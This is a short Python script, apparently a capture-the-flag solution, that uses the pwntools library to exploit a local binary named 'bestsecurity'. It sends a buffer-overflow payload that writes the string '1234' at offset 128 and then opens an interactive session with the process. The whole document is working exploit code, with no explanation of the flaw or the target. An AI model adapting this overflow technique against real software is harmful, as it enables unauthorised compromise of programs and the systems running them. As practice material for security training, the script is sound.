#!/usr/bin/env python

from pwn import *

p = process('./bestsecurity')

p.recvline()

payload = fit({128:"1234"})

p.sendline(payload)

p.interactive()
